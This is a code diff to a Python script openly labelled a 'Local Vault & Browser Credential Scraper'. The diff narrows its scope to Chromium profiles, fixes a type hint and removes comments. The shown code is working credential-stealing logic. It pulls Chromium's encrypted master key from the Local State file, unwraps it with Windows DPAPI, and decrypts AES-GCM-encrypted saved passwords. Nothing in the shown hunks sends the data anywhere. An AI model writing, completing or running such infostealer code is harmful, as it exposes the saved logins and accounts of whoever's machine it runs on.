@@ -1,9 +1,8 @@
 # ==========================================================
 # FILE: vault_extractor.py
 # VERSION: v1.0 — Local Vault & Browser Credential Scraper
-# DESCRIPTION: Extracts saved logins, credentials, and cookies
-#              from local Chromium and Firefox profiles on Windows
-#              using DPAPI decryption.
+# DESCRIPTION: Extracts saved logins and credentials from 
+#              local Chromium browser profiles using DPAPI.
 # ==========================================================
 
 import os
@@ -11,7 +10,6 @@ import json
 import sqlite3
 import shutil
 import base64
-from pathlib import Path
 
 try:
     import win32crypt
@@ -19,13 +17,12 @@ except ImportError:
     win32crypt = None
 
 
-def decrypt_password(ciphertext:, master_key: bytes | None = None) -> str:
+def decrypt_password(ciphertext: bytes, master_key: bytes | None = None) -> str:
     """Decrypts ciphertext encrypted by Windows DPAPI or Chromium AES-GCM master key."""
     if not win32crypt:
         return "[Error: pywin32 not installed]"
     
     try:
-        # Chromium v80+ AES-GCM encryption
         if ciphertext[:3] == b'v10' and master_key:
             from Crypto.Cipher import AES
             iv = ciphertext[3:15]
@@ -34,7 +31,6 @@ def decrypt_password(ciphertext:, master_key: bytes | None = None) -> str:
             cipher = AES.new(master_key, AES.MODE_GCM, iv)
             return cipher.decrypt_and_verify(payload, tag).decode('utf-8', errors='ignore')
         else:
-            # Legacy DPAPI DPAPI blob
             decrypted = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)
             return decrypted[1].decode('utf-8', errors='ignore')
     except Exception as e:
@@ -51,7 +47,7 @@ def get_chromium_master_key(local_state_path: str) -> bytes | None:
         encrypted_key_b64 = data.get("os_crypt", {}).get("encrypted_key")
         if not encrypted_key_b64:
             return None
-        encrypted_key = base64.b64decode(encrypted_key_b64)[5:] # Strip 'DPAPI' prefix
+        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
         decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
         return decrypted_key
     except Exception:
